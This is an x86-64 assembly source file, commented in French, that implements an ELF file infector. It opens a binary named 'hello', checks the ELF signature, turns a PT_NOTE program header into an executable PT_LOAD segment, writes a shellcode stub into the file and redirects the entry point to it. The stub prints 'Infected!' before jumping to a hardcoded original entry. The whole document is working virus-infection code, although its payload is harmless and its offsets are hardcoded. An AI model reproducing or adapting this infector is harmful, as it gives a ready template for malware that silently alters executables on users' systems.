section .data
    filename db "hello", 0
    elf_magic db 0x7F, "ELF", 0

    new_entry dq 0x1180         
    orig_entry dq 0
    pt_load_type dd 1           
    permissions dd 0x5          
    segment_offset dq 0x1180    
    segment_vaddr dq 0x1180     
    segment_paddr dq 0x1180     
    segment_filesz dq 0x200     ; Taille dans le fichier
    segment_memsz dq 0x200      ; Taille en mémoire

section .bss
    elf_header resb 64

section .text
    global _start

shellcode:
    push rax
    push rcx
    push rdx
    push rsi
    push rdi

    mov rax, 1              
    mov rdi, 1              
    lea rsi, [rel msg]      
    mov rdx, 9              
    syscall

    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rax

    ; Calcul de l'adresse de base (pour PIE)
    call get_base
get_base:
    pop rbx                 
    sub rbx, get_base - shellcode
    sub rbx, 0x1180        

    mov rax, rbx           
    add rax, [rel entry_offset]
    jmp rax                

msg db "Infected!", 0xa, 0
entry_offset dq 0x1060     
shellcode_end:
    shellcode_len equ shellcode_end - shellcode

_start:
    ; Ouverture du fichier
    mov rax, 2              
    lea rdi, [rel filename]
    mov rsi, 2              
    xor rdx, rdx
    syscall
    test rax, rax
    js exit_error
    mov r8, rax             

    ;verification signature elf
    mov rax, 0               ; sys_read
    mov rdi, r8              ; Descripteur de fichier
    lea rsi, [rel elf_header]; Buffer pour le header ELF
    mov rdx, 64  ; Taille à lire
    syscall

    ; Comparer les 4 premiers octets avec la signature ELF
    mov rsi, elf_header
    lea rdi, [rel elf_magic]
    mov rcx, 4

check_magic_bytes:
    mov al, [rsi]
    cmp al, [rdi]
    jne not_elf
    inc rsi
    inc rdi
    loop check_magic_bytes

    ; Lire l'entry point original
    mov rax, 8              
    mov rdi, r8
    mov rsi, 24             
    xor rdx, rdx
    syscall

    mov rax, 0              
    mov rdi, r8
    lea rsi, [rel orig_entry]
    mov rdx, 8
    syscall

    ; Convertir PT_NOTE en PT_LOAD
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200          ; Offset du PT_NOTE à modifier
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel pt_load_type]
    mov rdx, 4
    syscall

    ; Permissions
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 4      
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel permissions]
    mov rdx, 4
    syscall

    ; Offset dans le fichier
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 8     
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel segment_offset]
    mov rdx, 8
    syscall

    ; Adresse virtuelle
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 16    
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel segment_vaddr]
    mov rdx, 8
    syscall

    ; Adresse physique
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 24    
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel segment_paddr]
    mov rdx, 8
    syscall

    ; Taille dans le fichier
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 32    
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel segment_filesz]
    mov rdx, 8
    syscall

    ; Taille en mémoire
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 40    
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel segment_memsz]
    mov rdx, 8
    syscall

    ; Écrire le shellcode
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x1180        
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel shellcode]
    mov rdx, shellcode_len
    syscall

    ; Modifier l'entry point
    mov rax, 8              
    mov rdi, r8
    mov rsi, 24
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel new_entry]
    mov rdx, 8
    syscall

    ; Fermer le fichier
    mov rax, 3              
    mov rdi, r8
    syscall

    jmp exit_success

not_elf:
    ; Fermer le fichier et quitter si pas un ELF
    mov rax, 3
    mov rdi, r8
    syscall
    mov rax, 60
    mov rdi, 1
    syscall

exit_error:
    mov rax, 60             
    mov rdi, 1              
    syscall

exit_success:
    mov rax, 60             
    xor rdi, rdi            
    syscall